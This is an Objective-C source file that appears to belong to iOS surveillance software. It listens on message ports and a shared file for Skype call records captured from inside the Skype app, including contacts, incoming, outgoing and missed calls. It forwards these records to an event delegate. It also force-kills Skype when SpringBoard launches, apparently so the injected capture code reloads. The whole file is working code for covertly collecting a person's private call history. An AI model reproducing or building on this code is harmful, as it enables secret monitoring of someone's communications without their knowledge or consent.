//
//  SkypeCallLogCaptureManager.m
//  SkypeCallLogCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 8/21/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SkypeCallLogCaptureManager.h"

#import "DefStd.h"
#import "FxVoIPEvent.h"
#import "FxCallLogEvent.h"
#import "SpringBoardServices.h"
#import "SBDidLaunchNotifier.h"
#import "EventDelegate.h"


@interface SkypeCallLogCaptureManager (private)
- (void) sendEvent: (FxVoIPEvent *) aVoIPEvent;
- (BOOL) isSkypeIpadAppRunning;
- (void) springboardDidLaunch;
@end


#define SKYPE_INDENTIFIER			@"com.skype.skype"
#define SKYPEFORIPAD_INDENTIFIER	@"com.skype.SkypeForiPad"


@implementation SkypeCallLogCaptureManager

@synthesize mEventDelegate;


- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;

		mSBNotifier = [[SBDidLaunchNotifier alloc] init];
		[mSBNotifier setMDelegate:self];
		[mSBNotifier setMSelector:@selector(springboardDidLaunch)];
	}
	return self;
}

- (void) startCapture {
	DLog (@"Start capture Skype Call Log messenger");
	if (!mMessagePortReader1) {
		DLog (@"port 1")
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kSkypeCallLogMessagePort1 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		DLog (@"port 2")
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kSkypeCallLogMessagePort2
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];		
	}
	if (!mMessagePortReader3) {
		DLog (@"port 3")
		mMessagePortReader3 = [[MessagePortIPCReader alloc] initWithPortName:kSkypeCallLogMessagePort3
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader3 start];		
	}
			
	if (mMessagePortReader1	|| mMessagePortReader2 || mMessagePortReader3)
		[mSBNotifier start];
	
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kSkypeCallLogMessagePort1
																		  withDelegate:self];
			[mSharedFileReader1 start];
		}
		
		if (mSharedFileReader1) {
			[mSBNotifier start];
		}
	}
}

- (void) stopCapture {
	DLog (@"Stop capture Skype messenger");
	if (mMessagePortReader1 || mMessagePortReader2 || mMessagePortReader3) {
		[mSBNotifier stop];
	}
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
	if (mMessagePortReader3) {
		[mMessagePortReader3 stop];
		[mMessagePortReader3 release];
		mMessagePortReader3 = nil;
	}
	
	if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver	= [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
	NSDictionary *skypeInfo			= [unarchiver decodeObjectForKey:kSkypeArchived];
	NSString *bundleIdentifier		= [skypeInfo objectForKey:@"bundle"];
    FxVoIPEvent *voIPEvent			= [skypeInfo objectForKey:@"VoIPEvent"];
    [unarchiver finishDecoding];
	DLog(@"Skype - voIPEvent = %@, bundle = %@", voIPEvent, bundleIdentifier);
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
		if ([voIPEvent mDirection] == kEventDirectionIn		||	
			[voIPEvent mDirection] == kEventDirectionMissedCall) {
			if ([bundleIdentifier isEqualToString:SKYPEFORIPAD_INDENTIFIER]) {
				[self sendEvent:voIPEvent];
			} else if ([bundleIdentifier isEqualToString:SKYPE_INDENTIFIER]) {
				if (![self isSkypeIpadAppRunning]) { // Always true when this logic is run in Iphone
					[self sendEvent:voIPEvent];
				}
			}
		} else if ([voIPEvent mDirection] == kEventDirectionOut) { // Only most front application is called... (unlike facebook & messenger)
			[self sendEvent:voIPEvent];
		}
	}
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) sendEvent: (FxVoIPEvent *) aVoIPEvent {
	DLog (@"sending %@ ...", aVoIPEvent)
	if (mEventDelegate	&& [mEventDelegate respondsToSelector:@selector(eventFinished:)]) {		

//		FxCallLogEvent *dummyEvent = [[FxCallLogEvent alloc] init];
//		[dummyEvent setContactName:[aVoIPEvent mContactName]];
//		[dummyEvent setContactNumber:[aVoIPEvent mUserID]];
//		[dummyEvent	setDuration:[aVoIPEvent mDuration]];
//		[dummyEvent setDirection:[aVoIPEvent mDirection]];		
//		[dummyEvent setDateTime:[aVoIPEvent dateTime]];
//		[dummyEvent setEventType:kEventTypeCallLog];

		//[mEventDelegate performSelector:@selector(eventFinished:) withObject:dummyEvent];
		[mEventDelegate performSelector:@selector(eventFinished:) withObject:aVoIPEvent];
	}
}

- (BOOL) isSkypeIpadAppRunning {
	BOOL isSkypeIpadAppRunning = NO;
	NSArray *activeApps = (NSArray *)SBSCopyApplicationDisplayIdentifiers(YES, NO); // It returns wrongly after respring
	DLog (@"All active apps = %@", activeApps);
	for (NSString *bundleIdentifier in activeApps) {
		if ([bundleIdentifier isEqualToString:SKYPEFORIPAD_INDENTIFIER]) {
			isSkypeIpadAppRunning = YES;
			break;
		}
	}
	[activeApps release];
	return (isSkypeIpadAppRunning);
}

- (void) springboardDidLaunch {
	system("killall Skype"); // Skype for iPad
	system("killall Skype"); // Skype for iPhone
}

- (void) dealloc {
	[self stopCapture];
	[mSBNotifier release];
	[super dealloc];
}

@end
